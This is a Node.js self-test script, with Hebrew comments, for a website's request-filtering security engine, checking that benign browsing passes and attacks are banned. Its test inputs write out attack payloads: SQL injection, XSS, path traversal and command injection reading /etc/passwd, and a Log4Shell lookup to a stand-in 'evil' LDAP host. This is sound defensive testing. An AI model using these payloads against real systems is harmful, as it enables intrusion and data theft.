/**
 * בדיקה עצמית של מנוע האבטחה — מריצה בקשות סינתטיות על מסד זמני,
 * כדי לוודא שכל שכבה חוסמת את מה שהיא אמורה לחסום (ובעיקר: לא חוסמת סתם).
 *
 *   node scripts/security.mjs verify
 *
 * הבדיקה לא נוגעת במסד הנתונים האמיתי ולא משאירה עקבות.
 */

import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { createEngine } from "./engine.mjs";
import { banTtlSeconds } from "./store.mjs";

const PUBLIC_IP = "45.155.205.9"; // כתובת ציבורית לדוגמה — לא פנימית, כדי לבדוק חסימה אמתית

function request(overrides = {}) {
  return {
    ip: PUBLIC_IP,
    method: "GET",
    path: "/movies",
    query: "",
    host: "lemontank.example",
    httpVersion: "1.1",
    userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    headerMap: { "accept-language": "he-IL,he;q=0.9", accept: "text/html", "sec-fetch-mode": "navigate" },
    headerCount: 14,
    headerBytes: 1200,
    cookieBytes: 120,
    cookieHeader: "",
    referer: "",
    ...overrides,
  };
}

export function runSelfTest() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "lt-selftest-"));
  const engine = createEngine({ dbFile: path.join(dir, "test.db"), quiet: true });
  const results = [];
  let counter = 0;
  const nextIp = () => `45.155.205.${20 + counter++}`;

  const check = (name, pass, detail = "") => results.push({ name, pass, detail });

  const expect = (name, overrides, expectedActions) => {
    const res = engine.evaluate(request({ ip: nextIp(), ...overrides }));
    check(name, expectedActions.includes(res.action), `→ ${res.action} ${res.category ?? ""} ${res.reason ?? ""}`.slice(0, 90));
    return res;
  };

  /* ── מה שצריך לעבור ─────────────────────────────────────────────────────── */
  expect("גלישה רגילה", {}, ["allow"]);
  expect("חיפוש בעברית", { path: "/search", query: "q=%D7%94%D7%A1%D7%A0%D7%93%D7%A7" }, ["allow"]);
  expect("גרש בתקציר (תמים)", { path: "/search", query: "q=rock'n'roll" }, ["allow"]);
  expect("צפייה בעמוד כותר", { path: "/title/the-godfather-1972" }, ["allow"]);
  expect("בקשת API רגילה", { path: "/api/titles", query: "limit=24&kind=movie" }, ["allow"]);
  expect("עמוד התחברות", { path: "/login" }, ["allow"]);

  /* ── SQL Injection ──────────────────────────────────────────────────────── */
  expect("SQLi UNION SELECT", { query: "q=1+UNION+SELECT+password+FROM+users" }, ["ban"]);
  expect("SQLi OR 1=1", { query: "email=admin'%20OR%20'1'='1" }, ["ban"]);
  expect("SQLi time-based", { query: "id=1;SELECT%20SLEEP(5)" }, ["ban"]);
  expect("SQLi information_schema", { query: "q=x%20information_schema.tables" }, ["ban"]);

  /* ── XSS ────────────────────────────────────────────────────────────────── */
  expect("XSS script", { query: "q=<script>alert(1)</script>" }, ["ban", "block"]);
  expect("XSS onerror", { query: "name=<img%20src=x%20onerror=alert(1)>" }, ["ban", "block"]);
  expect("XSS javascript:", { query: "url=javascript:alert(1)" }, ["ban", "block"]);

  /* ── אחרים ──────────────────────────────────────────────────────────────── */
  expect("Path traversal", { query: "file=../../../../etc/passwd" }, ["ban"]);
  expect("RCE", { query: "cmd=;cat%20/etc/passwd" }, ["ban"]);
  expect("Log4Shell", { path: "/api/x", query: "a=${jndi:ldap://evil/x}" }, ["ban"]);
  expect("מלכודת /wp-login.php", { path: "/wp-login.php" }, ["ban"]);
  expect("מלכודת /.env", { path: "/.env" }, ["ban"]);
  expect("סורק sqlmap", { userAgent: "sqlmap/1.7#stable (http://sqlmap.org)" }, ["ban"]);
  expect("Burp Proxy-Connection", { headerMap: { ...request().headerMap, "proxy-connection": "keep-alive" } }, ["ban"]);
  expect("מתודה TRACE", { method: "TRACE" }, ["ban"]);
  expect("הברחת בקשות", { smuggling: "Content-Length + Transfer-Encoding" }, ["ban"]);
  expect("נתיב מערכת /.git/config", { path: "/.git/config" }, ["ban"]);

  /* ── חסימה חוזרת (החמרה) ────────────────────────────────────────────────── */
  const repeatIp = nextIp();
  engine.evaluate(request({ ip: repeatIp, query: "q=1+UNION+SELECT+1" }));
  const second = engine.ban({ ip: repeatIp, category: "sqli", reason: "חזרה" });
  check("החמרת חסימה בחזרה", second?.strikes === 2, `strikes=${second?.strikes}`);

  /* ── חסימה פעילה חוסמת גם בקשה תמימה ────────────────────────────────────── */
  const banned = engine.evaluate(request({ ip: repeatIp }));
  check("IP חסום נחסם בכל בקשה", banned.action === "block" && banned.banned === true, `→ ${banned.action} ${banned.category}`);

  /* ── חסינות כתובות פנימיות: לא נחסמות לצמיתות (מנע נעילה עצמית) ─────────── */
  const internal = engine.evaluate(request({ ip: "127.0.0.1", query: "q=1+UNION+SELECT+1" }));
  check("LAN פנימי: אין חסימת IP", !engine.isBanned("127.0.0.1"), `→ ${internal.action} (בלי רשומת חסימה)`);

  /* ── מצב ניטור לא חוסם ──────────────────────────────────────────────────── */
  engine.setSetting("mode", "monitor");
  const monitored = engine.evaluate(request({ ip: nextIp(), query: "q=1+UNION+SELECT+1" }));
  check("מצב ניטור: לוג בלי חסימה", monitored.action === "allow" && monitored.mode === "monitor", `→ ${monitored.action}`);
  engine.setSetting("mode", "enforce");

  /* ── הצפה ───────────────────────────────────────────────────────────────── */
  const floodIp = nextIp();
  engine.setSetting("rate_per_minute", "50");
  let flood = null;
  for (let i = 0; i < 300; i++) flood = engine.evaluate(request({ ip: floodIp, path: "/api/titles" }));
  check("הגבלת קצב והצפה", flood.action !== "allow" || Boolean(engine.isBanned(floodIp)), `→ ${flood.action} ${flood.category ?? ""}`);
  engine.setSetting("rate_per_minute", "600");

  /* ── כוח גס על התחברות ──────────────────────────────────────────────────── */
  const bruteIp = nextIp();
  let brute = null;
  for (let i = 0; i < 25; i++) {
    const row = engine.afterResponse({ ip: bruteIp, status: 401, path: "/api/auth/login", method: "POST" });
    if (row && !brute) brute = row;
  }
  check("חסימת כוח גס בהתחברות", Boolean(brute), brute ? `נחסם: ${brute.category} ל-${brute.ttl_sec}s` : "לא נחסם");

  /* ── טבלת זמני החסימה ──────────────────────────────────────────────────── */
  check("זמן חסימה מתאים לחומרה", banTtlSeconds("honeypot", 1) === 86_400 && banTtlSeconds("sqli", 2) === 14_400, `${banTtlSeconds("honeypot", 1)}s / ${banTtlSeconds("sqli", 2)}s`);

  engine.close();
  fs.rmSync(dir, { recursive: true, force: true });
  return results;
}
